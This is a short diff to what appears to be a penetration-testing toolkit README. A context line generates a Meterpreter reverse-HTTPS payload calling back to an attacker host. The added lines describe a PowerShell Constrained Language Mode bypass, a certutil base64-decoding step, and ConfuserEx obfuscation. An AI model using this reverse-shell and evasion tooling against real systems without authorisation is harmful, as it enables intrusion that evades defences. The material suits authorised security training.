@@ -47,6 +47,13 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=443 EXITFUNC=t
 2. Place inside and compile it.
 ```
 * ConfuserEX.zip - for PE obfuscation.
+* bypass-clm.exe - [CLM Bypass](https://github.com/Karmaz95/bypass-clm) => spawn PowerShell in current terminal.
+* clm_enc.txt - Same as bypass-clm.exe but base64 encoded with certutil and you can pass b64 encoded commands:
+```
+certutil -decode clm_enc.txt clm.exe
+# Example of b64 below checks if the PowerShell run in FullLanguage
+clm.exe "JABFAHgAZQBjAHUAdABpAG8AbgBDAG8AbgB0AGUAeAB0AC4AUwBlAHMAcwBpAG8AbgBTAHQAYQB0AGUALgBMAGEAbgBnAHUAYQBnAGUATQBvAGQAZQA="
+```
 
 ## SCORE 
 <p align="center">
